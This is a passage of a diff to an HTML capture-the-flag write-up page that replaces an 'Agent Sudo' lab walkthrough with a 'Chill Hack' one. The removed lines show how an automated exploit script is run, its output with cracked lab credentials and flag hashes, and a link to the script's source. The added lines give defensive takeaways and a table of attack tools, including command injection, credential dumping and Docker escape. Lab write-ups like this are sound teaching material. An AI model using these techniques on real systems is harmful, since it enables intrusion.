+                        Scripts with user-controlled input executed via <code>$msg</code> are
+                        trivial command injection vectors. Never execute unsanitized variables.
                     </div>
                 </div>
                 <div class="takeaway-card">
-                    <div class="takeaway-icon"><i class="fas fa-key"></i></div>
-                    <div class="takeaway-title">Strong Passwords Everywhere</div>
+                    <div class="takeaway-icon"><i class="fas fa-database"></i></div>
+                    <div class="takeaway-title">No Creds in Source Files</div>
                     <div class="takeaway-text">
-                        Both FTP (<code>crystal</code>) and ZIP (<code>alien</code>) fell
-                        to rockyou instantly. Enforce minimum complexity and length.
+                        Hardcoded MySQL root passwords and base64 &ldquo;encrypted&rdquo; secrets
+                        are not security. Use environment variables and proper secret management.
                     </div>
                 </div>
             </div>
-        </section>
-
-        <!-- EXPLOIT SCRIPT -->
-        <section class="writeup-section">
-            <div class="step-header">
-                <div class="step-num"><i class="fas fa-file-code" style="font-size:.55rem"></i></div>
-                <div>
-                    <div class="step-label">Automation</div>
-                    <h2 class="step-title">Full-Chain Exploit Script</h2>
-                </div>
-            </div>
-
-            <p>
-                The complete chain is automated in <code>agent_sudo_pwn.sh</code> &mdash; port scan,
-                User-Agent fuzzing, FTP brute-force, stego extraction chain, SSH access, and
-                CVE-2019-14287 privilege escalation.
-            </p>
-
-            <div class="code-block">
-                <div class="code-bar">
-                    <span class="code-lang">BASH</span>
-                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
-                </div>
-<pre><span class="cmd-p">$</span> chmod +x agent_sudo_pwn.sh
-<span class="cmd-p">$</span> ./agent_sudo_pwn.sh 10.49.129.194
-
-<span class="out-line">[+] Agent C &rarr; chris (weak password confirmed)</span>
-<span class="out-line">[+] FTP creds: chris:crystal</span>
-<span class="out-line">[+] ZIP password: alien</span>
-<span class="out-line">[+] Steghide passphrase: Area51</span>
-<span class="out-line">[+] SSH creds: james:hackerrules!</span>
-<span class="out-line" style="color:var(--aqua);">[FLAG] user_flag: b03d975e8c92a7c04146cfa7a5a313c7</span>
-<span class="out-line" style="color:var(--aqua);">[FLAG] root_flag: b53a02f55b57d4439e3341834d70c062</span></pre>
-            </div>
-
-            <p>
-                <a href="https://github.com/0xb0rn3/CTFS/tree/main/THM/Agent_Sudo" target="_blank" class="gh-link">
-                    <i class="fab fa-github"></i> View source on GitHub
-                </a>
-            </p>
         </section>
 
         <!-- TOOLS -->
@@ -1141,16 +1138,14 @@ done
                         <tr><th>Tool</th><th>Purpose</th></tr>
                     </thead>
                     <tbody>
-                        <tr><td><code>nmap</code></td><td>Port scanning and service detection</td></tr>
-                        <tr><td><code>wget</code></td><td>User-Agent fuzzing and FTP file retrieval</td></tr>
-                        <tr><td><code>hydra</code></td><td>FTP credential brute-force</td></tr>
-                        <tr><td><code>zsteg</code></td><td>PNG steganography analysis</td></tr>
-                        <tr><td><code>dd</code></td><td>Embedded file extraction from PNG</td></tr>
-                        <tr><td><code>john</code></td><td>ZIP password cracking</td></tr>
-                        <tr><td><code>7z</code></td><td>AES-encrypted ZIP extraction</td></tr>
+                        <tr><td><code>nmap</code></td><td>Port scanning and service enumeration</td></tr>
+                        <tr><td><code>ftp</code></td><td>Anonymous FTP file retrieval</td></tr>
+                        <tr><td><code>gobuster</code></td><td>Web directory brute-force</td></tr>
+                        <tr><td><code>curl</code></td><td>Command injection via POST requests</td></tr>
+                        <tr><td><code>mysql</code></td><td>Database enumeration and credential dump</td></tr>
+                        <tr><td><code>john</code></td><td>MD5 hash and ZIP password cracking</td></tr>
                         <tr><td><code>steghide</code></td><td>JPEG steganography extraction</td></tr>
-                        <tr><td><code>sshpass</code></td><td>Automated SSH access</td></tr>
-                        <tr><td><code>agent_sudo_pwn.sh</code></td><td>Full-chain automated exploit (Bash)</td></tr>
+                        <tr><td><code>docker</code></td><td>Privilege escalation via host mount</td></tr>
                     </tbody>
                 </table>
             </div>
@@ -1160,8 +1155,8 @@ done
 
     <footer class="footer">
         <p class="footer-text">
-            <span>[0xb0rn3]</span> &middot; CTF Writeup &middot; Agent Sudo &middot;
-            <span>CVE-2019-14287 &rarr; root</span>
+            <span>[0xb0rn3]</span> &middot; CTF Writeup &middot; Chill Hack &middot;
+            <span>Docker escape &rarr; root</span>
         </p>
     </footer>
 
